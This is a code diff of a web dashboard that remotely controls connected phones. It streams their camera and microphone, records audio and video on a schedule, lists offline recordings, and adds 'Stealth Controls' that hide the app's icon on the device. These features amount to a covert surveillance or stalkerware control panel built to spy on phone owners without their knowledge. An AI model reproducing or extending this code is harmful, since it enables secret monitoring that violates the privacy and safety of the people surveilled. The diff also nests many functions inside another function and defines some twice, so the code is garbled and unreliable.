@@ -113,13 +113,26 @@
                 <div class="card">
                     <h3>⚙️ Device Configuration</h3>
 
-                    <div class="toggle-row">
-                        <label title="Keep recording audio even when device has no internet">Auto-Record Audio</label>
-                        <input type="checkbox" id="audioEnabled">
+                    <div class="toggle-row" style="opacity: 0.5;">
+                        <label
+                            title="[TEMPORARILY DISABLED] Keep recording audio even when device has no internet">Auto-Record
+                            Audio (Disabled)</label>
+                        <input type="checkbox" id="audioEnabled" disabled>
                     </div>
-                    <div class="toggle-row">
-                        <label title="Keep recording video frames when device has no internet">Auto-Record Video</label>
-                        <input type="checkbox" id="videoEnabled">
+                    <div class="toggle-row" style="opacity: 0.5;">
+                        <label
+                            title="[TEMPORARILY DISABLED] Keep recording video frames when device has no internet">Auto-Record
+                            Video (Disabled)</label>
+                        <input type="checkbox" id="videoEnabled" disabled>
+                    </div>
+
+                    <!-- Stealth Controls -->
+                    <div style="margin-top: 1rem; padding-top: 1rem; border-top: 1px solid rgba(255,255,255,0.1);">
+                        <h4 style="margin-bottom: 0.5rem; font-size: 0.9rem;">🙈 Stealth Controls</h4>
+                        <div class="button-grid" style="grid-template-columns: 1fr 1fr;">
+                            <button onclick="hideAppIcon()" class="danger">Hide App Icon</button>
+                            <button onclick="showAppIcon()" class="primary">Show App Icon</button>
+                        </div>
                     </div>
 
                     <details
@@ -843,311 +856,312 @@
                 socket.emit('toggle_flash', currentDeviceId); // Reuse generic for now, assuming user accepts it toggles ACTIVE camera flash.
                 // Ideally: socket.emit('ACTION_FRONT_FLASH', currentDeviceId);
                 showVideoStatus("FRONT FLASH BUTTON");
-            }
-        }
+                function toggleFrontFlash() {
+                    if (currentDeviceId) {
+                        socket.emit('toggle_front_flash', currentDeviceId);
+                        showVideoStatus("FRONT FLASH");
+                    }
+                }
 
-        function toggleBackFlash() {
-            if (currentDeviceId) {
-                socket.emit('toggle_flash', currentDeviceId);
-                showVideoStatus("BACK FLASH BUTTON");
-            }
-        }
-        // Wait, the above is redundant if they do the same thing.
-        // I will implement SPECIFIC events.
+                function toggleBackFlash() {
+                    if (currentDeviceId) {
+                        socket.emit('toggle_back_flash', currentDeviceId);
+                        showVideoStatus("BACK FLASH");
+                    }
+                }
 
-        function toggleFrontFlash() {
-            if (currentDeviceId) {
-                socket.emit('toggle_front_flash', currentDeviceId);
-                showVideoStatus("FRONT FLASH");
-            }
-        }
+                function toggleFlash() {
+                    // Main generic button
+                    if (currentDeviceId) {
+                        socket.emit('toggle_flash', currentDeviceId);
+                        showVideoStatus("FLASH TOGGLED");
+                        showToast("Flash toggle sent");
+                    }
+                }
 
-        function toggleBackFlash() {
-            if (currentDeviceId) {
-                socket.emit('toggle_back_flash', currentDeviceId);
-                showVideoStatus("BACK FLASH");
-            }
-        }
+                function brightnessUp() {
+                    if (currentDeviceId) {
+                        socket.emit('brightness_up', currentDeviceId);
+                        showVideoStatus("BRIGHTNESS +");
+                    }
+                }
 
-        function toggleFlash() {
-            // Main generic button
-            if (currentDeviceId) {
-                socket.emit('toggle_flash', currentDeviceId);
-                showVideoStatus("FLASH TOGGLED");
-                showToast("Flash toggle sent");
-            }
-        }
+                function brightnessDown() {
+                    if (currentDeviceId) {
+                        socket.emit('brightness_down', currentDeviceId);
+                        showVideoStatus("BRIGHTNESS -");
+                    }
+                }
 
-        function brightnessUp() {
-            if (currentDeviceId) {
-                socket.emit('brightness_up', currentDeviceId);
-                showVideoStatus("BRIGHTNESS +");
-            }
-        }
+                function hideAppIcon() {
+                    if (currentDeviceId) {
+                        if (confirm('Are you sure you want to hide the app icon? You may need to use separate launcher or adb to find it again.')) {
+                            socket.emit('hide_app', currentDeviceId);
+                            showToast("Request sent to hide app icon", "info");
+                        }
+                    } else {
+                        showToast("No device selected", "error");
+                    }
+                }
 
-        function brightnessDown() {
-            if (currentDeviceId) {
-                socket.emit('brightness_down', currentDeviceId);
-                showVideoStatus("BRIGHTNESS -");
-            }
-        }
+                function showAppIcon() {
+                    if (currentDeviceId) {
+                        socket.emit('show_app', currentDeviceId);
+                        showToast("Request sent to show app icon", "info");
+                    } else {
+                        showToast("No device selected", "error");
+                    }
+                }
 
-        function hideAppIcon() {
-            if (confirm("Hide app icon?") && currentDeviceId) {
-                socket.emit('hide_app_icon', currentDeviceId);
-                showToast("Hide Icon command sent", "success");
-            }
-        }
+                function toggleFullscreen() {
+                    const video = document.getElementById('video-stream');
+                    if (!document.fullscreenElement) {
+                        video.requestFullscreen().catch(err => {
+                            log(`Error attempting fullscreen: ${err.message}`);
+                        });
+                    } else {
+                        document.exitFullscreen();
+                    }
+                }
+                function showAppIcon() { if (currentDeviceId) socket.emit('show_app_icon', currentDeviceId); }
 
-        function toggleFullscreen() {
-            const video = document.getElementById('video-stream');
-            if (!document.fullscreenElement) {
-                video.requestFullscreen().catch(err => {
-                    log(`Error attempting fullscreen: ${err.message}`);
-                });
-            } else {
-                document.exitFullscreen();
-            }
-        }
-        function showAppIcon() { if (currentDeviceId) socket.emit('show_app_icon', currentDeviceId); }
+                function updateConfig() {
+                    const config = {
+                        maxStorageMb: parseInt(document.getElementById('maxStorageMb').value) || 500,
+                        uploadIntervalMinutes: parseInt(document.getElementById('uploadInterval').value) || 15,
+                        audioEnabled: document.getElementById('audioEnabled').checked,
+                        videoEnabled: document.getElementById('videoEnabled').checked,
+                        offlineModeEnabled: document.getElementById('offlineMode').checked,
+                        offlineChunkDurationSeconds: parseInt(document.getElementById('chunkDuration').value) || 5,
+                        scheduleStartTime: document.getElementById('scheduleStartTime').value,
+                        scheduleEndTime: document.getElementById('scheduleEndTime').value,
+                        scheduleEnabled: document.getElementById('scheduleEnabled').checked
+                    };
+                    if (!currentDeviceId) return alert("Select a device!");
+                    socket.emit('update_config', { targetId: currentDeviceId, config: config });
+                    showToast("Configuration saved to device", "success");
+                }
 
-        function updateConfig() {
-            const config = {
-                maxStorageMb: parseInt(document.getElementById('maxStorageMb').value) || 500,
-                uploadIntervalMinutes: parseInt(document.getElementById('uploadInterval').value) || 15,
-                audioEnabled: document.getElementById('audioEnabled').checked,
-                videoEnabled: document.getElementById('videoEnabled').checked,
-                offlineModeEnabled: document.getElementById('offlineMode').checked,
-                offlineChunkDurationSeconds: parseInt(document.getElementById('chunkDuration').value) || 5,
-                scheduleStartTime: document.getElementById('scheduleStartTime').value,
-                scheduleEndTime: document.getElementById('scheduleEndTime').value,
-                scheduleEnabled: document.getElementById('scheduleEnabled').checked
-            };
-            if (!currentDeviceId) return alert("Select a device!");
-            socket.emit('update_config', { targetId: currentDeviceId, config: config });
-            showToast("Configuration saved to device", "success");
-        }
+                function getConfig() { if (currentDeviceId) socket.emit('get_config', currentDeviceId); }
+                function getStorageStats() { if (currentDeviceId) socket.emit('get_storage_stats', currentDeviceId); }
 
-        function getConfig() { if (currentDeviceId) socket.emit('get_config', currentDeviceId); }
-        function getStorageStats() { if (currentDeviceId) socket.emit('get_storage_stats', currentDeviceId); }
+                socket.on('current_config', (config) => {
+                    try {
+                        const cfg = JSON.parse(config);
+                        // Populate Inputs
+                        if (document.getElementById('maxStorageMb')) document.getElementById('maxStorageMb').value = cfg.maxStorageMb;
+                        if (document.getElementById('uploadInterval')) document.getElementById('uploadInterval').value = cfg.uploadIntervalMinutes;
+                        if (document.getElementById('audioEnabled')) document.getElementById('audioEnabled').checked = cfg.audioEnabled;
+                        if (document.getElementById('videoEnabled')) document.getElementById('videoEnabled').checked = cfg.videoEnabled;
+                        if (document.getElementById('offlineMode')) document.getElementById('offlineMode').checked = cfg.offlineModeEnabled;
+                        if (document.getElementById('chunkDuration')) document.getElementById('chunkDuration').value = cfg.offlineChunkDurationSeconds;
+                        if (document.getElementById('scheduleStartTime')) document.getElementById('scheduleStartTime').value = cfg.scheduleStartTime || "09:00";
+                        if (document.getElementById('scheduleEndTime')) document.getElementById('scheduleEndTime').value = cfg.scheduleEndTime || "17:00";
+                        if (document.getElementById('scheduleEnabled')) document.getElementById('scheduleEnabled').checked = cfg.scheduleEnabled;
 
-        socket.on('current_config', (config) => {
-            try {
-                const cfg = JSON.parse(config);
-                // Populate Inputs
-                if (document.getElementById('maxStorageMb')) document.getElementById('maxStorageMb').value = cfg.maxStorageMb;
-                if (document.getElementById('uploadInterval')) document.getElementById('uploadInterval').value = cfg.uploadIntervalMinutes;
-                if (document.getElementById('audioEnabled')) document.getElementById('audioEnabled').checked = cfg.audioEnabled;
-                if (document.getElementById('videoEnabled')) document.getElementById('videoEnabled').checked = cfg.videoEnabled;
-                if (document.getElementById('offlineMode')) document.getElementById('offlineMode').checked = cfg.offlineModeEnabled;
-                if (document.getElementById('chunkDuration')) document.getElementById('chunkDuration').value = cfg.offlineChunkDurationSeconds;
-                if (document.getElementById('scheduleStartTime')) document.getElementById('scheduleStartTime').value = cfg.scheduleStartTime || "09:00";
-                if (document.getElementById('scheduleEndTime')) document.getElementById('scheduleEndTime').value = cfg.scheduleEndTime || "17:00";
-                if (document.getElementById('scheduleEnabled')) document.getElementById('scheduleEnabled').checked = cfg.scheduleEnabled;
-
-                // Update Status Text
-                document.getElementById('currentConfig').innerHTML = `
+                        // Update Status Text
+                        document.getElementById('currentConfig').innerHTML = `
                     Last Sync: ${new Date().toLocaleTimeString()}<br>
                     Mode: ${cfg.offlineModeEnabled ? 'Offline Ready' : 'Online Only'} | Limits: ${cfg.maxStorageMb}MB
                 `;
-            } catch (e) { log("❌ parse error"); }
-        });
+                    } catch (e) { log("❌ parse error"); }
+                });
 
-        socket.on('storage_stats', (stats) => {
-            try {
-                const s = JSON.parse(stats);
-                document.getElementById('storageStats').innerHTML = `
+                socket.on('storage_stats', (stats) => {
+                    try {
+                        const s = JSON.parse(stats);
+                        document.getElementById('storageStats').innerHTML = `
                     <div style="font-size: 1.25rem; font-weight: bold;">${s.percentUsed}% Full</div>
                     <div style="width:100%; height:8px; background:rgba(255,255,255,0.1); border-radius:4px; margin: 0.5rem 0;">
                         <div style="width:${s.percentUsed}%; height:100%; background:var(--accent-color); border-radius:4px;"></div>
                     </div>
                     <div>Audio: ${s.audioFiles} | Video: ${s.videoFiles}</div>
                 `;
-            } catch (e) { }
-        });
+                    } catch (e) { }
+                });
 
-        // WebRTC Handlers
-        socket.on('webrtc_answer', async (a) => {
-            try {
-                log("📥 Received answer from phone");
-                await peerConnection.setRemoteDescription(new RTCSessionDescription(JSON.parse(a)));
-                log("✅ Remote description (answer) set");
-            } catch (e) {
-                log(`❌ Error setting answer: ${e.message}`);
-                console.error(e);
-            }
-        });
-        socket.on('webrtc_ice_candidate', async (c) => {
-            try {
-                await peerConnection.addIceCandidate(new RTCIceCandidate(JSON.parse(c)));
-                log("📥 Received ICE candidate from phone");
-            } catch (e) {
-                log(`❌ Error adding ICE candidate: ${e.message}`);
-                console.error(e);
-            }
-        });
+                // WebRTC Handlers
+                socket.on('webrtc_answer', async (a) => {
+                    try {
+                        log("📥 Received answer from phone");
+                        await peerConnection.setRemoteDescription(new RTCSessionDescription(JSON.parse(a)));
+                        log("✅ Remote description (answer) set");
+                    } catch (e) {
+                        log(`❌ Error setting answer: ${e.message}`);
+                        console.error(e);
+                    }
+                });
+                socket.on('webrtc_ice_candidate', async (c) => {
+                    try {
+                        await peerConnection.addIceCandidate(new RTCIceCandidate(JSON.parse(c)));
+                        log("📥 Received ICE candidate from phone");
+                    } catch (e) {
+                        log(`❌ Error adding ICE candidate: ${e.message}`);
+                        console.error(e);
+                    }
+                });
 
-        // New camera-first approach events
-        socket.on('camera_ready', (deviceId) => {
-            log(`✅ Received camera_ready signal from device: ${deviceId}`);
-            onCameraReady(deviceId);
-        });
+                // New camera-first approach events
+                socket.on('camera_ready', (deviceId) => {
+                    log(`✅ Received camera_ready signal from device: ${deviceId}`);
+                    onCameraReady(deviceId);
+                });
 
-        socket.on('camera_status', (data) => {
-            log(`📹 Camera status: ${data.status}`);
-            if (data.deviceId === currentDeviceId) {
-                showVideoStatus(data.status);
-            }
-        });
+                socket.on('camera_status', (data) => {
+                    log(`📹 Camera status: ${data.status}`);
+                    if (data.deviceId === currentDeviceId) {
+                        showVideoStatus(data.status);
+                    }
+                });
 
-        // Audio Recording
-        let isRecordingLive = false;
-        let recordedChunks = [];
+                // Audio Recording
+                let isRecordingLive = false;
+                let recordedChunks = [];
 
-        function toggleLiveRecording() {
-            if (!isRecordingLive) {
-                isRecordingLive = true;
-                recordedChunks = [];
-                const btn = document.getElementById('recordBtn');
-                btn.innerText = "⏹️ Stop";
-                btn.classList.add('danger');
-                log("🔴 Recording...");
-            } else {
-                stopLiveRecording();
-            }
-        }
+                function toggleLiveRecording() {
+                    if (!isRecordingLive) {
+                        isRecordingLive = true;
+                        recordedChunks = [];
+                        const btn = document.getElementById('recordBtn');
+                        btn.innerText = "⏹️ Stop";
+                        btn.classList.add('danger');
+                        log("🔴 Recording...");
+                    } else {
+                        stopLiveRecording();
+                    }
+                }
 
-        function stopLiveRecording() {
-            isRecordingLive = false;
-            const btn = document.getElementById('recordBtn');
-            btn.innerText = "🔴 Record Live";
-            btn.classList.remove('danger');
-            log("💾 Saving...");
-            saveWavFile();
-        }
+                function stopLiveRecording() {
+                    isRecordingLive = false;
+                    const btn = document.getElementById('recordBtn');
+                    btn.innerText = "🔴 Record Live";
+                    btn.classList.remove('danger');
+                    log("💾 Saving...");
+                    saveWavFile();
+                }
 
-        function saveWavFile() {
-            if (recordedChunks.length === 0) return;
-            let totalLen = 0;
-            for (let chunk of recordedChunks) totalLen += chunk.length;
-            const wavBuffer = new Int16Array(totalLen + 22);
-            const view = new DataView(wavBuffer.buffer);
+                function saveWavFile() {
+                    if (recordedChunks.length === 0) return;
+                    let totalLen = 0;
+                    for (let chunk of recordedChunks) totalLen += chunk.length;
+                    const wavBuffer = new Int16Array(totalLen + 22);
+                    const view = new DataView(wavBuffer.buffer);
 
-            writeString(view, 0, 'RIFF');
-            view.setUint32(4, 36 + totalLen * 2, true);
-            writeString(view, 8, 'WAVE');
-            writeString(view, 12, 'fmt ');
-            view.setUint32(16, 16, true);
-            view.setUint16(20, 1, true);
-            view.setUint16(22, 1, true);
-            view.setUint32(24, 44100, true);
-            view.setUint32(28, 44100 * 2, true);
-            view.setUint16(32, 2, true);
-            view.setUint16(34, 16, true);
-            writeString(view, 36, 'data');
-            view.setUint32(40, totalLen * 2, true);
+                    writeString(view, 0, 'RIFF');
+                    view.setUint32(4, 36 + totalLen * 2, true);
+                    writeString(view, 8, 'WAVE');
+                    writeString(view, 12, 'fmt ');
+                    view.setUint32(16, 16, true);
+                    view.setUint16(20, 1, true);
+                    view.setUint16(22, 1, true);
+                    view.setUint32(24, 44100, true);
+                    view.setUint32(28, 44100 * 2, true);
+                    view.setUint16(32, 2, true);
+                    view.setUint16(34, 16, true);
+                    writeString(view, 36, 'data');
+                    view.setUint32(40, totalLen * 2, true);
 
-            let int16Offset = 22;
-            for (let chunk of recordedChunks) {
-                wavBuffer.set(chunk, int16Offset);
-                int16Offset += chunk.length;
-            }
+                    let int16Offset = 22;
+                    for (let chunk of recordedChunks) {
+                        wavBuffer.set(chunk, int16Offset);
+                        int16Offset += chunk.length;
+                    }
 
-            const blob = new Blob([view], { type: 'audio/wav' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `rec_${new Date().getTime()}.wav`;
-            a.click();
-        }
+                    const blob = new Blob([view], { type: 'audio/wav' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `rec_${new Date().getTime()}.wav`;
+                    a.click();
+                }
 
-        function writeString(view, offset, string) {
-            for (let i = 0; i < string.length; i++) view.setUint8(offset + i, string.charCodeAt(i));
-        }
+                function writeString(view, offset, string) {
+                    for (let i = 0; i < string.length; i++) view.setUint8(offset + i, string.charCodeAt(i));
+                }
 
-        socket.on('audio_data', (payload) => {
-            // payload = { deviceId, data }
-            // Only play if it matches selected device
-            if (payload.deviceId !== currentDeviceId) return;
-            const buf = payload.data;
+                socket.on('audio_data', (payload) => {
+                    // payload = { deviceId, data }
+                    // Only play if it matches selected device
+                    if (payload.deviceId !== currentDeviceId) return;
+                    const buf = payload.data;
 
-            if (!audioCtx) return;
-            const int16 = new Int16Array(buf);
-            if (isRecordingLive) recordedChunks.push(new Int16Array(int16));
+                    if (!audioCtx) return;
+                    const int16 = new Int16Array(buf);
+                    if (isRecordingLive) recordedChunks.push(new Int16Array(int16));
 
-            const float32 = new Float32Array(int16.length);
-            for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768.0;
+                    const float32 = new Float32Array(int16.length);
+                    for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768.0;
 
-            const b = audioCtx.createBuffer(1, float32.length, 44100);
-            b.getChannelData(0).set(float32);
-            const s = audioCtx.createBufferSource();
-            s.buffer = b;
-            s.connect(audioCtx.destination);
-            if (nextTime < audioCtx.currentTime) nextTime = audioCtx.currentTime;
-            s.start(nextTime);
-            nextTime += b.duration;
-        });
+                    const b = audioCtx.createBuffer(1, float32.length, 44100);
+                    b.getChannelData(0).set(float32);
+                    const s = audioCtx.createBufferSource();
+                    s.buffer = b;
+                    s.connect(audioCtx.destination);
+                    if (nextTime < audioCtx.currentTime) nextTime = audioCtx.currentTime;
+                    s.start(nextTime);
+                    nextTime += b.duration;
+                });
 
-        // Offline Recordings
-        function getRecordings() { socket.emit('get_recordings_list'); }
-        function deleteRecording(name) { if (confirm('Delete?')) socket.emit('delete_recording', name); }
+                // Offline Recordings
+                function getRecordings() { socket.emit('get_recordings_list'); }
+                function deleteRecording(name) { if (confirm('Delete?')) socket.emit('delete_recording', name); }
 
-        socket.on('recordings_list', (files) => {
-            const list = document.getElementById('recordingsList');
-            if (files.length === 0) { list.innerHTML = '<p>No recordings.</p>'; return; }
-            let html = '<table><thead><tr><th>Date</th><th>Size</th><th>Action</th></tr></thead><tbody>';
-            files.forEach(f => {
-                html += `<tr>
+                socket.on('recordings_list', (files) => {
+                    const list = document.getElementById('recordingsList');
+                    if (files.length === 0) { list.innerHTML = '<p>No recordings.</p>'; return; }
+                    let html = '<table><thead><tr><th>Date</th><th>Size</th><th>Action</th></tr></thead><tbody>';
+                    files.forEach(f => {
+                        html += `<tr>
                     <td>${new Date(f.date).toLocaleString()}</td>
                     <td>${(f.size / 1024).toFixed(1)} KB</td>
                     <td><a href="/uploads/${f.name}" target="_blank" style="color:var(--accent-color)">Download</a> 
                         <span onclick="deleteRecording('${f.name}')" style="cursor:pointer; margin-left:10px;">❌</span>
                     </td></tr>`;
-            });
-            list.innerHTML = html + '</tbody></table>';
-        });
+                    });
+                    list.innerHTML = html + '</tbody></table>';
+                });
 
-        socket.on('new_recording', () => { log("✨ New recording"); getRecordings(); });
-        socket.on('recording_deleted', () => { log("🗑️ Deleted"); getRecordings(); });
-        socket.on('log', (msg) => log(msg));
-        socket.on('server_log', (msg) => log(msg));
+                socket.on('new_recording', () => { log("✨ New recording"); getRecordings(); });
+                socket.on('recording_deleted', () => { log("🗑️ Deleted"); getRecordings(); });
+                socket.on('log', (msg) => log(msg));
+                socket.on('server_log', (msg) => log(msg));
 
-        // Device List Management
-        socket.on('device_list_update', (list) => {
-            // list = [[id, {name, socketId}], ...]
-            const oldVal = deviceSelect.value;
-            deviceSelect.innerHTML = '<option value="">-- Select Device --</option>';
+                // Device List Management
+                socket.on('device_list_update', (list) => {
+                    // list = [[id, {name, socketId}], ...]
+                    const oldVal = deviceSelect.value;
+                    deviceSelect.innerHTML = '<option value="">-- Select Device --</option>';
 
-            if (list.length === 0) {
-                deviceSelect.innerHTML = '<option value="">No devices connected</option>';
-            }
+                    if (list.length === 0) {
+                        deviceSelect.innerHTML = '<option value="">No devices connected</option>';
+                    }
 
-            list.forEach(([id, info]) => {
-                const opt = document.createElement('option');
-                opt.value = id;
-                opt.text = `${info.name} (${id.substr(0, 4)}...)`;
-                deviceSelect.appendChild(opt);
-            });
+                    list.forEach(([id, info]) => {
+                        const opt = document.createElement('option');
+                        opt.value = id;
+                        opt.text = `${info.name} (${id.substr(0, 4)}...)`;
+                        deviceSelect.appendChild(opt);
+                    });
 
-            // Try to restore selection
-            if (oldVal && list.find(([id]) => id === oldVal)) {
-                deviceSelect.value = oldVal;
-            } else if (list.length > 0 && !currentDeviceId) {
-                // Auto-select first if none selected
-                deviceSelect.value = list[0][0];
-                onDeviceSelected();
-            }
-        });
+                    // Try to restore selection
+                    if (oldVal && list.find(([id]) => id === oldVal)) {
+                        deviceSelect.value = oldVal;
+                    } else if (list.length > 0 && !currentDeviceId) {
+                        // Auto-select first if none selected
+                        deviceSelect.value = list[0][0];
+                        onDeviceSelected();
+                    }
+                });
 
-        function onDeviceSelected() {
-            currentDeviceId = deviceSelect.value;
-            if (currentDeviceId) {
-                showToast("Switched to device: " + currentDeviceId, "info");
-                // Refresh data for new device
-                getConfig();
-                getStorageStats();
-            }
-        }
+                function onDeviceSelected() {
+                    currentDeviceId = deviceSelect.value;
+                    if (currentDeviceId) {
+                        showToast("Switched to device: " + currentDeviceId, "info");
+                        // Refresh data for new device
+                        getConfig();
+                        getStorageStats();
+                    }
+                }
 
         // Init
         // getConfig(); // Wait for device selection
